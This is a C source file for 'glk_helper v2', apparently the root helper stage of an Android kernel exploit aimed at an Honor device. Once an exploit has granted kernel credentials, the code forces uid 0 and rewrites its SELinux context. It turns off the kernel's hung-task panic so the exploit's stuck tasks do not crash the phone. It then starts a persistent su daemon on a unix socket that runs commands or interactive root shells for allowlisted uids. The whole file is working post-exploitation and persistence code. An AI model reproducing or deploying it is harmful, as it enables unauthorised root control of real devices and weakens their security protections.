/*
 * glk_helper v2: post-W2 static root helper with an authenticated su daemon.
 *
 * Exec'd directly from the rooted victim child (no mksh in between, because
 * mksh drops the inherited capabilities). At entry the process already carries
 * init_cred (euid=0, full caps) but its real uid is polluted by the relink's
 * second write, so setresuid() has to be called *after* this exec.
 *
 * v2 replaces the unauthenticated TCP:2323 shell (any app holding INTERNET
 * could reach it on loopback and get root) with a unix-domain socket gated by
 * SO_PEERCRED: only allowlisted uids get a command executed. The allowlist is
 * compiled in (root / system / shell) and can be extended by appending uids to
 * /data/local/tmp/.glk/allow from a root session.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define PROOF "/data/local/tmp/glk_root_proof.txt"
#define SU_DIR "/data/local/tmp/.glk"
#define SU_SOCK SU_DIR "/su.sock"
#define SU_LOG SU_DIR "/su.log"
#define SU_ALLOW SU_DIR "/allow"

#define MAX_CMD (64 * 1024)

/* Appended to the session stream once the child is reaped, so the client can
 * learn the exit status. Control bytes keep it invisible on a terminal, and
 * glk_su.c strips it before touching stdout. */
#define EXIT_TRAILER(fmt) "\001\001GLKRC=" fmt "\001\001"

static void enter_shell_domain(void) {
    int fd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
    if (fd < 0) return;
    (void) write(fd, "u:r:shell:s0", 12);
    close(fd);
}

static void append_enforce(int log_fd) {
    char buf[32] = {0};
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    ssize_t n = fd >= 0 ? read(fd, buf, sizeof(buf) - 1) : -1;
    if (fd >= 0) close(fd);
    dprintf(log_fd, "enforce=%s", n > 0 ? buf : "unreadable\n");
}

/* This Honor kernel runs its hung-task detector with panic=1 and a 30s
 * timeout, so any task left blocked by the exploit's futex chain takes the
 * whole device down a few minutes after root. Disarm it so a stuck task only
 * logs and root keeps working until the next reboot. */
static void disarm_hungtask_panic(int log_fd) {
    static const struct {
        const char *path;
        const char *value;
    } knobs[] = {
            {"/proc/sys/kernel/hung_task_panic", "0"},
            {"/proc/sys/kernel/hung_task_timeout_secs", "120"},
    };
    for (size_t i = 0; i < sizeof(knobs) / sizeof(knobs[0]); i++) {
        int fd = open(knobs[i].path, O_WRONLY | O_CLOEXEC);
        if (fd < 0) {
            if (log_fd >= 0) dprintf(log_fd, "disarm %s: open e%d\n", knobs[i].path, errno);
            continue;
        }
        ssize_t n = write(fd, knobs[i].value, strlen(knobs[i].value));
        int e = errno;
        close(fd);
        if (log_fd >= 0) {
            dprintf(log_fd, "disarm %s -> %s (n=%zd e%d)\n", knobs[i].path,
                    n > 0 ? "ok" : "fail", n, e);
        }
    }
}

/* ---- su authorisation -------------------------------------------------- */

static int uid_is_allowed(uid_t uid) {
    /* root and shell only by default. uid 1000 (system) is deliberately not
     * here: every system app shares it, so allowing it would silently hand
     * root to all of them. Add explicit uids to the allow file instead. */
    if (uid == 0 || uid == 2000) return 1;
    FILE *f = fopen(SU_ALLOW, "r");
    if (!f) return 0;
    char line[64];
    int ok = 0;
    while (fgets(line, sizeof(line), f)) {
        char *p = line;
        while (*p == ' ' || *p == '\t') p++;
        if (*p == '#' || *p == '\n' || !*p) continue;
        if ((uid_t) strtoul(p, NULL, 10) == uid) {
            ok = 1;
            break;
        }
    }
    fclose(f);
    return ok;
}

static void audit_log(uid_t uid, pid_t pid, const char *mode, const char *cmd) {
    int fd = open(SU_LOG, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
    if (fd < 0) return;
    time_t now = time(NULL);
    struct tm tm;
    char stamp[32];
    localtime_r(&now, &tm);
    strftime(stamp, sizeof(stamp), "%m-%d %H:%M:%S", &tm);
    dprintf(fd, "[%s] uid=%u pid=%d %s %s\n", stamp, (unsigned) uid, (int) pid, mode,
            cmd ? cmd : "-");
    close(fd);
}

static ssize_t read_full(int fd, char *buf, size_t n) {
    size_t got = 0;
    while (got < n) {
        ssize_t r = read(fd, buf + got, n - got);
        if (r <= 0) break;
        got += (size_t) r;
    }
    return (ssize_t) got;
}

static void run_child(int c, const char *mode, char *cmd) {
    /* main() sets SIGCHLD to SIG_IGN, which makes the kernel reap children
     * automatically and would break waitpid below. Reset it in this handler
     * copy only -- the listener is unaffected. */
    signal(SIGCHLD, SIG_DFL);

    pid_t child = fork();
    if (child == 0) {
        dup2(c, 0);
        dup2(c, 1);
        dup2(c, 2);
        close(c);
        enter_shell_domain();
        if (strcmp(mode, "shell") == 0) {
            execl("/system/bin/sh", "sh", "-i", (char *) NULL);
        } else {
            execl("/system/bin/sh", "sh", "-c", cmd, (char *) NULL);
        }
        _exit(5);
    }
    if (child < 0) return;

    /* This handler still holds the socket, so waiting here does not block the
     * listener (which forks a handler per connection). Every byte the session
     * wrote is already in the socket buffer when the child exits, so the exit
     * trailer below always lands after the real output. */
    int st = 0;
    int rc = 1;
    if (waitpid(child, &st, 0) == child) {
        if (WIFEXITED(st)) rc = WEXITSTATUS(st);
        else if (WIFSIGNALED(st)) rc = 128 + WTERMSIG(st);
    }

    char trailer[48];
    int n = snprintf(trailer, sizeof(trailer), EXIT_TRAILER("%d"), rc);
    if (n > 0) {
        ssize_t off = 0;
        while (off < n) {
            ssize_t w = write(c, trailer + off, (size_t) (n - off));
            if (w <= 0) break;
            off += w;
        }
    }
}

static void handle_client(int c, uid_t uid, pid_t pid) {
    char header[80];
    size_t h = 0;
    header[0] = '\0';
    while (h < sizeof(header) - 1) {
        char ch;
        ssize_t r = read(c, &ch, 1);
        if (r <= 0) break;
        if (ch == '\n') break;
        header[h++] = ch;
    }
    header[h] = '\0';

    if (strncmp(header, "EXEC ", 5) == 0) {
        long len = strtol(header + 5, NULL, 10);
        if (len < 0 || len > MAX_CMD) {
            (void) write(c, "su: bad request\n", 16);
            return;
        }
        char *cmd = calloc(1, (size_t) len + 1);
        if (!cmd) return;
        read_full(c, cmd, (size_t) len);
        audit_log(uid, pid, "exec", cmd);
        run_child(c, "exec", cmd);
        free(cmd);
        return;
    }

    if (strncmp(header, "SHELL", 5) == 0) {
        audit_log(uid, pid, "shell", NULL);
        run_child(c, "shell", NULL);
        return;
    }

    (void) write(c, "su: bad request\n", 16);
}

static void serve_su(void) {
    (void) mkdir(SU_DIR, 0755);
    chmod(SU_DIR, 0755);
    unlink(SU_SOCK);

    int s = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (s < 0) return;
    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SU_SOCK, sizeof(addr.sun_path) - 1);
    if (bind(s, (struct sockaddr *) &addr, sizeof(addr)) != 0) return;
    chmod(SU_SOCK, 0666);
    if (listen(s, 8) != 0) return;

    for (;;) {
        int c = accept4(s, NULL, NULL, SOCK_CLOEXEC);
        if (c < 0) continue;

        struct ucred cred;
        socklen_t len = sizeof(cred);
        if (getsockopt(c, SOL_SOCKET, SO_PEERCRED, &cred, &len) != 0) {
            close(c);
            continue;
        }
        if (!uid_is_allowed(cred.uid)) {
            audit_log(cred.uid, cred.pid, "denied", NULL);
            char deny[64];
            int dn = snprintf(deny, sizeof(deny), "su: permission denied\n" EXIT_TRAILER("126"));
            if (dn > 0) (void) write(c, deny, (size_t) dn);
            close(c);
            continue;
        }

        /* One handler process per connection: a long-running root command must
         * never stall the next su request. The handler parses the request and
         * forks the session process, then exits. */
        pid_t handler = fork();
        if (handler == 0) {
            handle_client(c, cred.uid, cred.pid);
            _exit(0);
        }
        close(c);
    }
}

int main(void) {
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    int log_fd = open(PROOF, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
    if (log_fd >= 0) {
        dprintf(log_fd, "helper pid=%d uid=%d euid=%d gid=%d egid=%d\n",
                getpid(), getuid(), geteuid(), getgid(), getegid());
    }
    errno = 0;
    int rg = setresgid(0, 0, 0);
    int rg_errno = errno;
    errno = 0;
    int ru = setresuid(0, 0, 0);
    int ru_errno = errno;
    if (log_fd >= 0) {
        dprintf(log_fd, "setresgid=%d(e%d) setresuid=%d(e%d)\n", rg, rg_errno, ru, ru_errno);
        dprintf(log_fd, "after uid=%d euid=%d gid=%d egid=%d\n",
                getuid(), geteuid(), getgid(), getegid());
        append_enforce(log_fd);
        disarm_hungtask_panic(log_fd);
        dprintf(log_fd, "su_socket=%s\n", SU_SOCK);
        close(log_fd);
    }
    chmod(PROOF, 0644);
    enter_shell_domain();
    serve_su();
    return 0;
}
